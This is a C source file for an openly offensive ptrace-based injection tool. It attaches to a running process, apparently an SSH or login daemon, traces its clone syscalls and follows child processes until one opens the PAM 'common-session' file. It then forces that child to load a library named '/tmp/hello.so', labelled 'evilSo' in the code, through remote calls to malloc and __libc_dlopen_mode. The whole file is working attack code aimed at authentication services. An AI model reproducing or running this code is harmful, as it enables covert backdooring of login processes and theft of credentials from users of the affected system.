#include <stdlib.h>
#include <pthread.h>

#include "utils.h"


int Test_Inject_Shellcode(pid_t target_pid){
        struct user_regs_struct regs, original_regs;
        void *mmap_addr, *dlopen_mode_addr;
        uint8_t *remote_code_ptr;


        char evilSoPath[] = "/tmp/hello.so";
        if ( ptrace_attach( target_pid ) == -1 ){

                printf("inject attach failed\n" );
                return -1;
        }

        printf ("+ Waiting for process...\n");

    printf ("+ Getting Registers\n");
        if ( ptrace_getregs( target_pid, &regs ) == -1 ){
                printf("- Getregs Error\n" );
                return -1;
        }
        memcpy(&original_regs,&regs,sizeof(struct user_regs_struct));
    printf ("+ Injecting shell code at %p\n", (void*)regs.rip);
    void* libc_moudle_base = NULL;
        libc_moudle_base = get_module_base(-1,"libc-");
        printf("+ self libc moudle base:%p\n",libc_moudle_base);
        mmap_addr = get_remote_addr( target_pid, "libc-", (void *)malloc );
        char libc_path[255];
        get_libc_path(target_pid,libc_path);
        printf("+ remote libc path:%s\n",libc_path);
        void * handle = dlopen(libc_path,RTLD_LAZY);
        void * self_dlopen_mode_addr = dlsym(handle,"__libc_dlopen_mode");
        printf("+ self libc_dlopen_mode base:%p\n",self_dlopen_mode_addr);

        dlopen_mode_addr = get_remote_addr( target_pid, "libc-", (void *)self_dlopen_mode_addr );

        printf("+ remote mmap addr:%p\n",mmap_addr);

        printf("+ remote libc_dlopen_mode addr:%p\n",dlopen_mode_addr);
        long parameters[10];
        parameters[0] = 0x4000; // size


        if(ptrace_call( target_pid, (uint64_t)mmap_addr, parameters, 1,&regs,0 )==-1){
                printf("- Writedata Error\n" );
                return -1;
        }
        if ( ptrace_getregs( target_pid, &regs ) == -1 ){
                printf("- Getregs Error\n" );
                return -1;
        }
        printf("+ mmap:%p\n",regs.rax);


        remote_code_ptr = (char *)regs.rax; //获取mmap取得的地址


        ptrace_writedata(target_pid,remote_code_ptr,evilSoPath,strlen(evilSoPath)+1);

        printf("+ Writing EvilSo Path at:%p\n",remote_code_ptr);
        parameters[1] = 0x2;      // addr
        parameters[0] = remote_code_ptr; // size
        if(ptrace_call( target_pid, (uint64_t)dlopen_mode_addr, parameters, 2,&regs,0 )==-1){
                printf("- Called dlopen_mode_addr Error\n" );
                return -1;
        }

        printf("+ EvilSo Injected.\n+ Recorver the regsing...\n");
        ptrace_setregs( target_pid, &original_regs );
        ptrace_continue( target_pid );

}



int WaitforLibPAM(pid_t target_pid){
    struct user_regs_struct regs;
    if ( ptrace_attach( target_pid ) == -1 ){

        printf("WaitforLibPAM attach Failed\n" );
        return -1;
    }
    if ( ptrace_getregs( target_pid, &regs ) == -1 ){
        printf("-- Getregs Error\n" );
        return -1;
    }
    //ptrace_continue( target_pid );
    long num,bit=0,finded = 0;
    char *path = malloc(255);
    char libsystemd[] = "common-session";
    while(1){
        ptrace( PTRACE_SYSCALL, target_pid, NULL, 0  );
        waitpid( target_pid, NULL, WUNTRACED );
        num = ptrace(PTRACE_PEEKUSER, target_pid, ORIG_RAX * 8, NULL);
            //printf("++ SubProcess: system call num = %ld\n", num);
        if(num ==257){
            ptrace_getregs( target_pid, &regs ) ;
            printf("++ SubProcess: rsi :%p\n",regs.rsi);
            ptrace_readdata(target_pid,(void *)regs.rsi,path,255);
            printf("++ SubProcess:openat path :%s\n",path);
            if(strstr(path,libsystemd)){
                ptrace_detach(target_pid);
                Test_Inject_Shellcode(target_pid);
                break;
            }
        }
    }
}

int main2(pid_t  target_pid)
{


    struct user_regs_struct regs;

    if ( ptrace_attach( target_pid ) == -1 ){

        printf("main2 attach\n" );
        return -1;
    }

    if ( ptrace_getregs( target_pid, &regs ) == -1 ){
        printf("- Getregs Error\n" );
        return -1;
    }

    long num,bit=0,finded = 0;
    while(1){
    ptrace( PTRACE_SYSCALL, target_pid, NULL, 0  );
    waitpid( target_pid, NULL, WUNTRACED );
    pthread_t id;
    if(bit){
            num = ptrace(PTRACE_PEEKUSER, target_pid, ORIG_RAX * 8, NULL);
            if(num == 56){
                printf("main2 system call num = %ld\n", num);
                finded = 1;
            }
            bit =0;
    }else{
            ptrace_getregs( target_pid, &regs );
            num = ptrace(PTRACE_PEEKUSER, target_pid, RAX*8, NULL);
            if (finded == 1 )
            {
                printf("Main2 Process is = %ld or %ld \nStarting Injecting....\n", num,regs.rax);
                pthread_create(&id,NULL,(void *) WaitforLibPAM,num);
                printf("Injecting..End\n");
                finded = 0;
            }
            bit = 1;
        }
    }
    
        return 0;
}


int main(int argc, char const *argv[])
{

    pid_t                   target_pid;
    target_pid = atoi (argv[1]);
    //Test_Inject_Shellcode(target_pid);

    struct user_regs_struct regs;
    if ( ptrace_attach( target_pid ) == -1 ){

        printf("attach\n" );
        return -1;
    }
    printf ("+ Waiting for process...\n");
    //wait (NULL);
    printf ("+ Getting Registers\n");
    if ( ptrace_getregs( target_pid, &regs ) == -1 ){
        printf("- Getregs Error\n" );
        return -1;
    }
    printf ("+ RAX is %p\n", (void*)regs.rax);
    //ptrace_continue( target_pid );
    long num,subprocess;
    while(1){
        ptrace( PTRACE_SYSCALL, target_pid, NULL, 0  );
        waitpid( target_pid, NULL, WUNTRACED );
        pthread_t id;
        num = ptrace(PTRACE_PEEKUSER, target_pid, ORIG_RAX * 8, NULL);// 获得调用号值
        if(num == 56){
            printf("system call num = %ld\n", num);
            ptrace_getregs( target_pid, &regs ); // 获得调用结果
            printf("Process maybe = %ld \n", regs.rax);
            subprocess = regs.rax;
            pthread_create(&id,NULL,(void *) WaitforLibPAM,subprocess);
        }
    }
    
        return 0;
}

